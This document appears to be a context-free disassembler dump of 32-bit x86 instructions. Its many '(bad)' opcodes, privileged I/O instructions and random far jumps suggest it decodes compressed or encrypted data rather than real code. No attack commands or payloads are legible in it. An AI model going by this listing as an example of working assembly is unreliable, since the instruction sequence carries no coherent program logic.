  41a6c8:	repz vpsrlw ymm0,ymm5,XMMWORD PTR ds:0xc7c75b0d
  41a6d1:	cdq    
  41a6d2:	mov    eax,0xdc68adca
  41a6d7:	mov    ecx,0x1d697ad9
  41a6dc:	push   ebx
  41a6dd:	int3   
  41a6de:	or     eax,0x25941614
  41a6e3:	mov    edi,0xcfa509b2
  41a6e8:	xor    esi,ecx
  41a6ea:	fxch   st(3)
  41a6ec:	xor    bl,BYTE PTR [eax-0x67]
  41a6ef:	mov    dh,0x1f
  41a6f1:	gs pop ebx
  41a6f3:	adc    esi,edi
  41a6f5:	es adc edi,0x15
  41a6f9:	pop    esp
  41a6fa:	xor    bl,BYTE PTR [ecx+0x1a]
  41a6fd:	add    BYTE PTR [edx+0x1d],dh
  41a700:	and    eax,0x710b75df
  41a705:	mov    dl,0x37
  41a707:	sbb    al,0xbc
  41a709:	pop    esi
  41a70a:	xchg   esi,eax
  41a70b:	cmp    bh,BYTE PTR [ebp+0x7ed915aa]
  41a711:	mov    WORD PTR [ebp+0x10],fs
  41a714:	popa   
  41a715:	fcmovne st,st(3)
  41a717:	push   ss
  41a718:	push   ecx
  41a719:	pop    esi
  41a71a:	push   ss
  41a71b:	adc    al,0x2e
  41a71d:	fnstcw WORD PTR [edi]
  41a71f:	push   esi
  41a720:	or     BYTE PTR fs:[edi-0x5f0f437b],dh
  41a727:	jne    0x41a6d3
  41a729:	cmp    ch,bh
  41a72b:	push   esi
  41a72c:	stos   DWORD PTR es:[edi],eax
  41a72d:	or     BYTE PTR [ebx+0x2d],al
  41a730:	arpl   WORD PTR [eax+eax*2],bx
  41a733:	inc    ebp
  41a734:	out    0x6d,eax
  41a736:	gs ret 0x91e9
  41a73a:	sbb    DWORD PTR [ecx+0x52df11e4],ecx
  41a740:	mov    edx,0x17b07052
  41a745:	ror    al,1
  41a747:	cdq    
  41a748:	repz rol DWORD PTR [eax+0x1d],0x8f
  41a74d:	inc    ecx
  41a74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74f:	jno    0x41a6ef
  41a751:	adc    DWORD PTR [ebp+0x30],0xffffffbf
  41a755:	mov    al,ds:0x74a7f63e
  41a75a:	jl     0x41a7d8
  41a75c:	add    eax,DWORD PTR [ebp+0x5aeabacb]
  41a762:	cmp    ecx,ecx
  41a764:	mov    al,0xbe
  41a766:	inc    edx
  41a767:	scas   al,BYTE PTR es:[edi]
  41a768:	add    al,0xa9
  41a76a:	sub    al,0x69
  41a76c:	aam    0xf0
  41a76e:	jne    0x41a708
  41a770:	xor    bh,BYTE PTR [ebx]
  41a772:	pop    edx
  41a773:	scas   eax,DWORD PTR es:[edi]
  41a774:	jo     0x41a72c
  41a776:	cmp    bh,bl
  41a778:	inc    esi
  41a779:	xor    dh,BYTE PTR [ecx+0x5b]
  41a77c:	mov    al,0x60
  41a77e:	sbb    eax,0xbb9cffeb
  41a783:	lea    edx,[edx+0x45ffe078]
  41a789:	add    DWORD PTR [edi-0x68df60af],ebp
  41a78f:	add    WORD PTR [edx-0x3e5ceb5b],cx
  41a796:	retf   
  41a797:	in     eax,0x89
  41a799:	cli    
  41a79a:	xor    cl,BYTE PTR [esp+ebx*4-0x3a]
  41a79e:	sti    
  41a79f:	jmp    FWORD PTR [edx+0x54]
  41a7a2:	fsubr  st,st(3)
  41a7a4:	cmovge edx,DWORD PTR [edx]
  41a7a7:	shr    BYTE PTR [edx],1
  41a7a9:	enter  0x7c55,0x93
  41a7ad:	cmp    BYTE PTR [ecx],al
  41a7af:	jnp    0x41a754
  41a7b1:	push   0x47
  41a7b3:	jbe    0x41a79e
  41a7b5:	je     0x41a778
  41a7b7:	mov    al,dl
  41a7b9:	pushf  
  41a7ba:	sbb    BYTE PTR [edx+0x2d],dl
  41a7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7be:	xor    eax,0xcad1c395
  41a7c3:	add    eax,DWORD PTR [edx]
  41a7c5:	add    DWORD PTR [eax-0x30],0xd1fc5ab4
  41a7cc:	out    dx,eax
  41a7cd:	es ins BYTE PTR es:[edi],dx
  41a7cf:	es sub eax,0x64c2fad0
  41a7d5:	xor    edi,DWORD PTR [eax-0x3f]
  41a7d8:	add    edi,DWORD PTR [ebp+0x73]
  41a7db:	clc    
  41a7dc:	mov    ah,0xbf
  41a7de:	(bad)  
  41a7df:	inc    esi
  41a7e0:	xor    al,bl
  41a7e2:	and    eax,DWORD PTR [esi-0x25413994]
  41a7e8:	xor    al,0x68
  41a7ea:	jbe    0x41a842
  41a7ec:	jno    0x41a787
  41a7ee:	sub    eax,0x98cd3d66
  41a7f3:	or     bh,BYTE PTR fs:[edi]
  41a7f6:	mov    ds:0x81fd578a,eax
  41a7fb:	int3   
  41a7fc:	jl     0x41a7b5
  41a7fe:	sub    eax,DWORD PTR [eax-0x21e1b316]
  41a804:	xor    al,0x16
  41a806:	stos   BYTE PTR es:[edi],al
  41a807:	mov    es,edx
  41a809:	enter  0x2d6b,0xc3
  41a80d:	je     0x41a7e5
  41a80f:	pop    eax
  41a810:	icebp  
  41a811:	xchg   ebx,eax
  41a812:	es (bad) 
  41a814:	das    
  41a815:	enter  0x81fc,0xe1
  41a819:	rol    DWORD PTR [eax-0x23971921],0xe7
  41a820:	aad    0x9b
  41a822:	(bad)  
  41a823:	and    DWORD PTR cs:[edx],esp
  41a826:	xchg   esi,eax
  41a827:	sub    al,0xc1
  41a829:	shl    edx,1
  41a82b:	push   edx
  41a82c:	adc    bl,BYTE PTR [ebx-0x2ff9e7ad]
  41a832:	lahf   
  41a833:	dec    ebx
  41a834:	fstp   DWORD PTR [esi-0x4494e4c1]
  41a83a:	cmp    ebp,DWORD PTR [eax-0x14503663]
  41a840:	retf   0x36cf
  41a843:	cmp    cl,BYTE PTR [eax-0x3974878f]
  41a849:	fsubr  st,st(5)
  41a84b:	inc    esp
  41a84c:	aas    
  41a84d:	push   ecx
  41a84e:	ins    DWORD PTR es:[edi],dx
  41a84f:	add    BYTE PTR [eax+edx*1],ah
  41a852:	sub    BYTE PTR [esp+ebx*1],cl
  41a855:	ins    DWORD PTR es:[edi],dx
  41a856:	cmp    BYTE PTR [esi+0x79],ah
  41a859:	scas   eax,DWORD PTR es:[edi]
  41a85a:	push   ecx
  41a85b:	popf   
  41a85c:	out    0x56,al
  41a85e:	mov    ah,0xd2
  41a860:	sub    al,0x1b
  41a862:	push   ebp
  41a863:	cs mov cl,0xb3
  41a866:	jmp    0x64d1:0x4a10de7
  41a86d:	push   esp
  41a86e:	xchg   edi,eax
  41a86f:	and    al,0x56
  41a871:	xlat   BYTE PTR ds:[ebx]
  41a872:	xchg   esp,eax
  41a873:	cwde   
  41a874:	mov    eax,ds:0xfc005bcf
  41a879:	sub    ebp,edi
  41a87b:	popf   
  41a87c:	rol    BYTE PTR [edi+0x44],0xcc
  41a880:	lds    ebp,FWORD PTR [ebx]
  41a882:	xchg   ah,dl
  41a884:	add    DWORD PTR [ebp-0x5d],0xf99b6a21
  41a88b:	out    dx,eax
  41a88c:	pop    es
  41a88d:	lahf   
  41a88e:	sahf   
  41a88f:	(bad)  
  41a890:	mul    bh
  41a892:	add    edi,eax
  41a894:	mov    dl,BYTE PTR [ecx]
  41a896:	test   eax,0x5447daeb
  41a89b:	sub    al,cl
  41a89d:	jmp    0x3005:0x38a0f678
  41a8a4:	mov    bl,0x1a
  41a8a6:	(bad)  
  41a8a7:	in     al,0x16
  41a8a9:	repz push ss
  41a8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8ac:	out    0xf6,al
  41a8ae:	out    0x4d,eax
  41a8b0:	into   
  41a8b1:	sub    dh,BYTE PTR ss:[edx]
  41a8b4:	jl     0x41a88d
  41a8b6:	xlat   BYTE PTR ds:[ebx]
  41a8b7:	xchg   DWORD PTR [ebx],ebp
  41a8b9:	scas   eax,DWORD PTR es:[edi]
  41a8ba:	(bad)  
  41a8bb:	loope  0x41a8f9
  41a8bd:	sub    esi,0xfffffff7
  41a8c0:	stc    
  41a8c1:	jb     0x41a90c
  41a8c3:	cmp    BYTE PTR [edi+0x1e],ah
  41a8c6:	or     eax,0x1ace165c
  41a8cb:	popa   
  41a8cc:	outs   dx,DWORD PTR ds:[esi]
  41a8cd:	pop    esi
  41a8ce:	pop    eax
  41a8cf:	outs   dx,DWORD PTR ds:[esi]
  41a8d0:	fdivrp st(3),st
  41a8d2:	fwait
  41a8d3:	sbb    ah,cl
  41a8d5:	fsub   QWORD PTR [ecx+0x1d]
  41a8d8:	and    eax,0x1f45150a
  41a8dd:	idiv   BYTE PTR [eax+ecx*8-0x33fe150]
  41a8e4:	bound  edx,QWORD PTR [ebx+0x1e6b1477]
  41a8ea:	xchg   esi,eax
  41a8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ec:	mov    cl,0x5c
  41a8ee:	call   0x93bbb290
  41a8f3:	hlt    
  41a8f4:	out    0x21,eax
  41a8f6:	test   al,0xec
  41a8f8:	and    DWORD PTR [ebx],esi
  41a8fa:	(bad)  
  41a8fb:	or     al,0x1e
  41a8fd:	test   eax,0xb1b59fb9
  41a902:	int    0x9c
  41a904:	retf   0x6cff
  41a907:	cdq    
  41a908:	cmp    al,0x6f
  41a90a:	pop    ss
  41a90b:	sahf   
  41a90c:	call   0x3180a588
  41a911:	jp     0x41a8aa
  41a913:	in     eax,dx
  41a914:	mov    ecx,0x87897be5
  41a919:	or     eax,ecx
  41a91b:	hlt    
  41a91c:	scas   eax,DWORD PTR es:[edi]
  41a91d:	lock cwde 
  41a91f:	or     BYTE PTR ds:0xf35363b6,cl
  41a925:	adc    ah,0x17
  41a928:	dec    eax
  41a929:	push   esi
  41a92a:	es xchg bp,ax
  41a92d:	jmp    DWORD PTR [edi+0x62]
  41a930:	fld    QWORD PTR [ecx+0x50]
  41a933:	xor    eax,0xd38abfe0
  41a938:	dec    ecx
  41a939:	in     al,dx
  41a93a:	stc    
  41a93b:	retf   0x62d8
  41a93e:	push   cs
  41a93f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a940:	sbb    eax,esp
  41a942:	nop
  41a943:	jns    0xebcf6d7f
  41a949:	mov    ebx,0x5fa36d59
  41a94e:	cmp    al,0xf
  41a950:	out    0x8c,eax
  41a952:	jmp    0xca440f04
  41a957:	into   
  41a958:	dec    esp
  41a959:	xor    al,0xfb
  41a95b:	hlt    
  41a95c:	push   ebp
  41a95d:	mov    cl,0x13
  41a95f:	dec    esp
  41a960:	int3   
  41a961:	scas   eax,DWORD PTR es:[edi]
  41a962:	out    dx,al
  41a963:	scas   al,BYTE PTR es:[edi]
  41a964:	jp     0x41a96e
  41a966:	in     al,dx
  41a967:	jnp    0x41a9a3
  41a969:	dec    ebx
  41a96a:	pop    ebp
  41a96b:	adc    BYTE PTR [ecx+edi*4-0x20],dl
  41a96f:	retf   0x592f
  41a972:	in     eax,0xa4
  41a974:	fcomp  QWORD PTR [ebx+edi*2-0x340874cd]
  41a97b:	or     BYTE PTR [ebp+0x4e847a36],ah
  41a981:	fcom   QWORD PTR [ebx+0x5b0773f1]
  41a987:	and    BYTE PTR [ecx],al
  41a989:	pop    ecx
  41a98a:	adc    BYTE PTR [ebx+0x6c],dl
  41a98d:	or     esp,eax
  41a98f:	test   al,0x8
  41a991:	rol    BYTE PTR [ebp+0x36e98f54],cl
  41a997:	dec    edi
  41a998:	xlat   BYTE PTR ds:[ebx]
  41a999:	dec    ebx
  41a99a:	adc    eax,0xb2cc1072
  41a99f:	push   esp
  41a9a0:	leave  
  41a9a1:	leave  
  41a9a2:	adc    esi,eax
  41a9a4:	lahf   
  41a9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9a6:	aam    0x9c
  41a9a8:	mov    edx,0x75bac3a8
  41a9ad:	sub    eax,0x57da9002
  41a9b2:	lods   al,BYTE PTR ds:[esi]
  41a9b3:	aad    0x73
  41a9b5:	inc    ebx
  41a9b6:	(bad)  
  41a9b7:	xlat   BYTE PTR ds:[ebx]
  41a9b8:	mov    esi,DWORD PTR [edx+0x37]
  41a9bb:	fs popf 
  41a9bd:	arpl   WORD PTR [edi+0x2090f7fc],di
  41a9c3:	outs   dx,DWORD PTR ds:[esi]
  41a9c4:	dec    eax
  41a9c5:	mov    DWORD PTR [ebp+ebp*2-0x5e],edi
  41a9c9:	into   
  41a9ca:	inc    ah
  41a9cc:	mov    ch,0xb0
  41a9ce:	cmp    al,0xef
  41a9d0:	je     0x41a9d2
  41a9d2:	clc    
  41a9d3:	out    0xdf,al
  41a9d5:	pop    ebx
  41a9d6:	sbb    DWORD PTR [esi+0x8],edx
  41a9d9:	imul   esp,DWORD PTR [edi+0x54],0xfffffffb
  41a9dd:	xor    al,0xfc
  41a9df:	sbb    DWORD PTR [edi-0x2c4f395c],edi
  41a9e5:	ins    DWORD PTR es:[edi],dx
  41a9e6:	imul   edi,ebp,0x68
  41a9e9:	jmp    0x529c:0xf96035ff
  41a9f0:	mov    bh,0x66
  41a9f2:	dec    edi
  41a9f3:	push   ds
  41a9f4:	data16 sbb ah,BYTE PTR [ebp+0x77ebdb58]
  41a9fb:	jbe    0x41aa34
  41a9fd:	cmp    BYTE PTR [eax-0x34],0xaa
  41aa01:	cmp    DWORD PTR [ebx],edx
  41aa03:	cdq    
  41aa04:	fild   QWORD PTR [esi+0x2c]
  41aa07:	mov    dh,0xbb
  41aa09:	adc    ecx,DWORD PTR [eax+0x3782d563]
  41aa0f:	inc    edi
  41aa10:	ret    0x8b8c
  41aa13:	scas   eax,DWORD PTR es:[edi]
  41aa14:	shl    DWORD PTR [eax+0x568c2df7],cl
  41aa1a:	jl     0x41aa1c
  41aa1c:	repz mov esp,0xa92158fc
  41aa22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa23:	pushf  
  41aa24:	cmp    eax,0x2056f97b
  41aa29:	pop    es
  41aa2a:	rol    BYTE PTR [esi+0x51a1b3c7],0xa4
  41aa31:	inc    esp
  41aa32:	out    0x75,eax
  41aa34:	ret    0x78bc
  41aa37:	repz dec edi
  41aa39:	stos   DWORD PTR es:[edi],eax
  41aa3a:	mov    BYTE PTR [ecx+0x66],al
  41aa3d:	loope  0x41a9d6
  41aa3f:	jns    0x41aa0d
  41aa41:	ds pop edi
  41aa43:	pop    ss
  41aa44:	js     0x41aaab
  41aa46:	iret   
  41aa47:	inc    ebx
  41aa48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa49:	stos   DWORD PTR es:[edi],eax
  41aa4a:	outs   dx,BYTE PTR ds:[esi]
  41aa4b:	sahf   
  41aa4c:	fbstp  TBYTE PTR ds:0x744c18b1
  41aa52:	fisubr DWORD PTR [ecx-0x5d]
  41aa55:	add    DWORD PTR [edx],edi
  41aa57:	das    
  41aa58:	arpl   WORD PTR [ebp-0x13541201],di
  41aa5e:	add    al,0xa2
  41aa60:	jecxz  0x41aa62
  41aa62:	mov    DWORD PTR [esi+ecx*8],esi
  41aa65:	pop    eax
  41aa66:	or     DWORD PTR [edx+0x4e73fa59],esp
  41aa6c:	sbb    al,0x6f
  41aa6e:	inc    esp
  41aa6f:	push   esi
  41aa70:	outs   dx,BYTE PTR ds:[esi]
  41aa71:	push   edx
  41aa72:	push   ss
  41aa73:	cwde   
  41aa74:	adc    BYTE PTR [ebp-0x44],bh
  41aa77:	mov    al,ds:0x183ea4b6
  41aa7c:	mov    bh,0x46
  41aa7e:	lods   al,BYTE PTR ds:[esi]
  41aa7f:	xchg   ebp,eax
  41aa80:	xchg   ebx,eax
  41aa81:	push   ss
  41aa82:	adc    bh,BYTE PTR [ebx]
  41aa84:	into   
  41aa85:	inc    ebp
  41aa86:	inc    eax
  41aa87:	out    0xac,al
  41aa89:	cli    
  41aa8a:	mov    ds:0x5993c866,al
  41aa8f:	push   eax
  41aa90:	push   eax
  41aa91:	mov    esi,0x93eab97b
  41aa96:	call   0x8ca5e1e
  41aa9b:	pop    esp
  41aa9c:	lods   eax,DWORD PTR ds:[esi]
  41aa9d:	jmp    0xad4b:0x89a62cab
  41aaa4:	out    dx,eax
  41aaa5:	or     al,0x27
  41aaa7:	and    dl,BYTE PTR [eax+0x28]
  41aaaa:	stc    
  41aaab:	ror    dh,cl
  41aaad:	xchg   BYTE PTR [edi+esi*1+0x2d7d1008],al
  41aab4:	lods   eax,DWORD PTR ds:[esi]
  41aab5:	out    0x69,eax
  41aab7:	cli    
  41aab8:	push   esi
  41aab9:	mov    esp,0x3e429a78
  41aabe:	or     eax,0xd4d6373d
  41aac3:	iret   
  41aac4:	xchg   ecx,esi
  41aac6:	cld    
  41aac7:	gs cmp eax,0xd56f5c9d
  41aacd:	mov    ds:0xc4122e20,eax
  41aad2:	xor    DWORD PTR [esi],ebp
  41aad4:	xchg   BYTE PTR [eax+0x4c],bh
  41aad7:	or     esp,ebx
  41aad9:	into   
  41aada:	das    
  41aadb:	test   al,0x59
  41aadd:	and    BYTE PTR [ecx+0x28],bl
  41aae0:	xchg   eax,esp
  41aae2:	xor    eax,0x5e45e54a
  41aae7:	xchg   ebp,eax
  41aae8:	push   cs
  41aae9:	test   DWORD PTR [eax+0x1d],ebx
  41aaec:	or     ebp,DWORD PTR [esi+0x11324e29]
  41aaf2:	or     BYTE PTR [edi],bh
  41aaf4:	loop   0x41aa98
  41aaf6:	xor    al,0x49
  41aaf8:	sbb    bh,BYTE PTR [esi+0x3ad65b7f]
  41aafe:	cwde   
  41aaff:	push   edx
  41ab00:	and    BYTE PTR [eax-0x7b],dh
  41ab03:	aas    
  41ab04:	jae    0x41ab71
  41ab06:	ja     0x41aab8
  41ab08:	lock test eax,0x8d47300a
  41ab0e:	pop    eax
  41ab0f:	ds mov al,fs:0x2552d60c
  41ab16:	xchg   edi,eax
  41ab17:	ret    0x9201
  41ab1a:	or     DWORD PTR [esi],edx
  41ab1c:	stos   BYTE PTR es:[edi],al
  41ab1d:	stc    
  41ab1e:	(bad)  
  41ab1f:	mov    ah,0x89
  41ab21:	enter  0x24db,0xfe
  41ab25:	inc    edi
  41ab26:	or     BYTE PTR [ebp+ebx*2+0x8b80443],bh
  41ab2d:	xchg   esi,eax
  41ab2e:	and    DWORD PTR [edi+0x68a5fc79],0xaf868bba
  41ab38:	pop    ebx
  41ab39:	add    DWORD PTR [edx-0x61],0x41
  41ab3d:	scas   al,BYTE PTR es:[edi]
  41ab3e:	xor    DWORD PTR [edx-0x5b],ebx
  41ab41:	shl    DWORD PTR [edx],cl
  41ab43:	cmp    DWORD PTR [ebp+0x67],esp
  41ab46:	pop    ds
  41ab47:	loopne 0x41aaf1
  41ab49:	out    0x68,al
  41ab4b:	clc    
  41ab4c:	outs   dx,DWORD PTR ds:[esi]
  41ab4d:	add    al,0x4e
  41ab4f:	mov    edx,0x9b99bf3f
  41ab54:	sbb    al,0x4e
  41ab56:	xchg   ecx,eax
  41ab57:	push   esi
  41ab58:	bnd jle 0x41ab91
  41ab5b:	cwde   
  41ab5c:	rcl    esi,cl
  41ab5e:	cld    
  41ab5f:	xchg   esi,eax
  41ab60:	out    dx,al
  41ab61:	mov    ebx,ecx
  41ab63:	leave  
  41ab64:	pusha  
  41ab65:	mov    dh,0x45
  41ab67:	enter  0xb3a0,0x5e
  41ab6b:	icebp  
  41ab6c:	ror    DWORD PTR [esi-0x1ad083f],1
  41ab72:	sub    al,0x2c
  41ab74:	or     eax,0x3056bed2
  41ab79:	pop    es
  41ab7a:	daa    
  41ab7b:	pop    ds
  41ab7c:	clc    
  41ab7d:	dec    ebx
  41ab7e:	sbb    al,0xee
  41ab80:	jb     0x41ab10
  41ab82:	xor    eax,0x22815997
  41ab87:	neg    BYTE PTR [eax+0x34]
  41ab8a:	pushf  
  41ab8b:	adc    eax,0xe108d10
  41ab90:	fdivrp st(0),st
  41ab92:	sbb    esp,DWORD PTR [ebx-0x71]
  41ab95:	sahf   
  41ab96:	jg     0x41abb1
  41ab98:	and    edi,DWORD PTR [esi]
  41ab9a:	jno    0x41ab7f
  41ab9c:	sub    ebx,DWORD PTR [ebx-0x23553ca6]
  41aba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aba3:	xor    ecx,DWORD PTR [esp+ecx*1-0x32]
  41aba7:	sar    BYTE PTR [eax],cl
  41aba9:	retf   0xea1b
  41abac:	nop
  41abad:	fwait
  41abae:	adc    ah,BYTE PTR [ebp+eiz*4-0x40]
  41abb2:	cmp    bl,BYTE PTR [edx]
  41abb4:	out    0xf2,al
  41abb6:	add    edi,DWORD PTR [esi]
  41abb8:	cmp    ch,ch
  41abba:	jae    0x41abc4
  41abbc:	sahf   
  41abbd:	sar    DWORD PTR [esi+0x6],1
  41abc0:	(bad)  
  41abc1:	imul   esi,DWORD PTR [edx-0x50],0x4051d0fd
  41abc8:	mov    ecx,0xdce7a2a0
  41abcd:	leave  
  41abce:	int    0xb2
  41abd0:	repz ret 
  41abd2:	jmp    DWORD PTR [edi-0x2b]
  41abd5:	pop    ebp
  41abd6:	or     DWORD PTR [ecx],esi
  41abd8:	aas    
  41abd9:	in     eax,dx
  41abda:	push   ds
  41abdb:	add    cl,BYTE PTR ds:0x93239b73
  41abe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abe2:	sub    al,0x47
  41abe4:	bound  edx,QWORD PTR [esi+0x53d67319]
  41abea:	or     bh,BYTE PTR [edi-0x6f5f4b16]
  41abf0:	mov    ebp,0x7afd9262
  41abf5:	in     al,0x8b
  41abf7:	push   eax
  41abf8:	xchg   edi,eax
  41abf9:	mov    bh,0x57
  41abfb:	jnp    0x41ab9f
  41abfd:	in     eax,0x54
  41abff:	mov    DWORD PTR [edx-0x7],esp
  41ac02:	enter  0x86cc,0xdb
  41ac06:	out    dx,al
  41ac07:	mov    ebp,0x4652c8ae
  41ac0c:	mov    esp,0xe88d2dc5
  41ac11:	xchg   DWORD PTR [edi],ebx
  41ac13:	sub    al,0xc
  41ac15:	jo     0x41ac94
  41ac17:	iret   
  41ac18:	iret   
  41ac19:	jg     0x41abdf
  41ac1b:	xlat   BYTE PTR ds:[ebx]
  41ac1c:	push   0xbde48a80
  41ac21:	mov    ecx,0xeac63dfb
  41ac26:	pushf  
  41ac27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac28:	push   cs
  41ac29:	repnz ss cwde 
  41ac2c:	and    BYTE PTR [esi+0x26],0x3d
  41ac30:	loope  0x41ac69
  41ac32:	jo     0x41abdb
  41ac34:	in     al,0x9c
  41ac36:	jl     0x41ac74
  41ac38:	inc    ecx
  41ac39:	pop    ebx
  41ac3a:	call   0xcfc8:0x8b4f0b33
  41ac41:	mov    ebp,0x1724d4f9
  41ac46:	retw   0x238b
  41ac4a:	retf   0x24cf
  41ac4d:	and    BYTE PTR [ebx-0x28],bl
  41ac50:	pop    eax
  41ac51:	adc    eax,0x64c04e13
  41ac56:	stc    
  41ac57:	dec    eax
  41ac58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac59:	mov    edx,DWORD PTR [edx-0xb30acde]
  41ac5f:	lds    edi,FWORD PTR [edx-0x7eef799c]
  41ac65:	and    al,0xfa
  41ac67:	or     ch,BYTE PTR fs:[esi]
  41ac6a:	add    cl,BYTE PTR [eax+0x2cd23e63]
  41ac70:	ror    BYTE PTR [esi-0x29cb8eb7],1
  41ac76:	push   edi
  41ac77:	test   BYTE PTR [ebx],0xed
  41ac7a:	outs   dx,BYTE PTR ds:[esi]
  41ac7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac7c:	pop    edi
  41ac7d:	outs   dx,BYTE PTR ds:[esi]
  41ac7e:	je     0x41ac1c
  41ac80:	lock dec edi
  41ac82:	cli    
  41ac83:	jbe    0x41acd4
  41ac85:	jb     0x41acf9
  41ac87:	lea    edx,[ebp+0x23]
  41ac8a:	rol    BYTE PTR [ecx],0x7b
  41ac8d:	pusha  
  41ac8e:	adc    DWORD PTR [ecx],edi
  41ac90:	retfw  
  41ac92:	(bad)  
  41ac93:	ds xchg ebx,eax
  41ac95:	sbb    ah,BYTE PTR [edi+ebp*1+0x22a7e3c3]
  41ac9c:	(bad)  
  41ac9d:	fsub   DWORD PTR [edx]
  41ac9f:	test   DWORD PTR [ebx],0xdae740ed
  41aca5:	nop
  41aca6:	mov    edi,0x36f9ea75
  41acab:	test   DWORD PTR [edx+0x73],0x3bd7d58f
  41acb2:	pushf  
  41acb3:	xchg   DWORD PTR ds:0x6b9ee14c,ebp
  41acb9:	aad    0xb2
  41acbb:	cmp    BYTE PTR [ecx],ah
  41acbd:	out    dx,al
  41acbe:	ins    DWORD PTR es:[edi],dx
  41acbf:	outs   dx,BYTE PTR ds:[esi]
  41acc0:	push   esi
  41acc1:	outs   dx,DWORD PTR ds:[esi]
  41acc2:	cwde   
  41acc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acc4:	loope  0x41acb9
  41acc6:	mov    dh,0x82
  41acc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acc9:	mov    dh,BYTE PTR [eax]
  41accb:	scas   al,BYTE PTR es:[edi]
  41accc:	cmp    BYTE PTR [eax-0x4a0bb60a],ah
  41acd2:	sub    esi,DWORD PTR [ebx]
  41acd4:	jp     0x41ac8c
  41acd6:	cdq    
  41acd7:	rol    BYTE PTR [ecx],1
  41acd9:	jno    0x41acc5
  41acdb:	fisub  WORD PTR [esi]
  41acdd:	xchg   esi,eax
  41acde:	test   ebp,0x5fde08b8
  41ace4:	dec    eax
  41ace5:	hlt    
  41ace6:	push   eax
  41ace7:	fistp  QWORD PTR [edi-0x3c12af59]
  41aced:	daa    
  41acee:	gs jmp 0x50afe8dc
  41acf4:	retf   0x20a7
  41acf7:	and    BYTE PTR [edx+ebx*2+0x70],bl
  41acfb:	out    0xa1,al
  41acfd:	mov    bh,0xb
  41acff:	std    
  41ad00:	xor    DWORD PTR [eax],ebx
  41ad02:	mov    eax,ds:0xef5c11d4
  41ad07:	ss mov esi,0xcb051989
  41ad0d:	pop    ss
  41ad0e:	pusha  
  41ad0f:	pop    edi
  41ad10:	sar    BYTE PTR [edi],cl
  41ad12:	lock out dx,eax
  41ad14:	push   esp
  41ad15:	mov    ebp,0x205b994
  41ad1a:	outs   dx,DWORD PTR ds:[esi]
  41ad1b:	es or  edi,ebp
  41ad1e:	ds call 0xbd19:0xb475f2f5
  41ad26:	nop
  41ad27:	or     eax,0x6c74a44e
  41ad2c:	and    ch,cl
  41ad2e:	dec    ebx
  41ad2f:	jg     0x41ad97
  41ad31:	inc    esi
  41ad32:	inc    ebp
  41ad33:	xor    ah,BYTE PTR [edx+0x5]
  41ad36:	push   esp
  41ad37:	push   ds
  41ad38:	inc    ebx
  41ad39:	fwait
  41ad3a:	retf   
  41ad3b:	add    BYTE PTR [ebx+ecx*4],dl
  41ad3e:	jle    0x41acd2
  41ad40:	std    
  41ad41:	xchg   ebx,eax
  41ad42:	jo     0x41ad55
  41ad44:	popa   
  41ad45:	ret    
  41ad46:	push   es
  41ad47:	bound  edx,QWORD PTR [ebx+ecx*4-0x5489eca8]
  41ad4e:	jne    0x41ace7
  41ad50:	ret    0xe4b1
  41ad53:	mov    ecx,0xb480cd1e
  41ad58:	jl     0x41ada2
  41ad5a:	lahf   
  41ad5b:	push   ecx
  41ad5c:	sti    
  41ad5d:	or     eax,0x566ef276
  41ad62:	getsec 
  41ad64:	lahf   
  41ad65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad66:	mov    al,0x3
  41ad68:	mov    ds,WORD PTR [ebx-0x2f]
  41ad6b:	push   ds
  41ad6c:	(bad)  
  41ad6d:	leave  
  41ad6e:	outs   dx,BYTE PTR ds:[esi]
  41ad6f:	sbb    ebp,ebx
  41ad71:	in     eax,dx
  41ad72:	in     eax,dx
  41ad73:	popf   
  41ad74:	cmp    ebp,DWORD PTR [edi+0x50619dac]
  41ad7a:	sbb    DWORD PTR [edx],eax
  41ad7c:	pop    edx
  41ad7d:	mov    edx,0x26ad1ff8
  41ad82:	dec    edi
  41ad83:	shr    eax,1
  41ad85:	pop    ds
  41ad86:	loope  0x41adfb
  41ad88:	fisttp DWORD PTR [ebx]
  41ad8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad8b:	inc    esp
  41ad8c:	xchg   esi,eax
  41ad8d:	test   eax,0xc8f5cc8c
  41ad92:	cmp    dl,cl
  41ad94:	mov    esp,0xbb4bd1f3
  41ad99:	adc    eax,0x6e2b17e3
  41ad9f:	aaa    
  41ada0:	jne    0x41ad31
  41ada2:	and    ch,ch
  41ada4:	cdq    
  41ada5:	stos   BYTE PTR es:[edi],al
  41ada6:	pop    ebp
  41ada7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ada8:	pusha  
  41ada9:	fs sub dl,dl
  41adac:	loopne 0x41ae1d
  41adae:	leave  
  41adaf:	fs out dx,al
  41adb1:	sub    DWORD PTR [edi-0x53],esi
  41adb4:	inc    esp
  41adb5:	hlt    
  41adb6:	iret   
  41adb7:	stos   BYTE PTR es:[edi],al
  41adb8:	xor    DWORD PTR [edx-0x56c153bd],ecx
  41adbe:	ins    DWORD PTR es:[edi],dx
  41adbf:	ins    DWORD PTR es:[edi],dx
  41adc0:	lahf   
  41adc1:	shl    ebp,cl
  41adc3:	sbb    al,0xab
  41adc5:	push   0x3c
  41adc7:	push   ds
  41adc8:	xchg   ecx,eax
  41adc9:	das    
  41adca:	xchg   edx,edi
  41adcc:	call   DWORD PTR [esi+0x1a7f2bad]
  41add2:	adc    al,0x3f
  41add4:	cmp    edx,DWORD PTR [eax+ebp*8+0x78e17260]
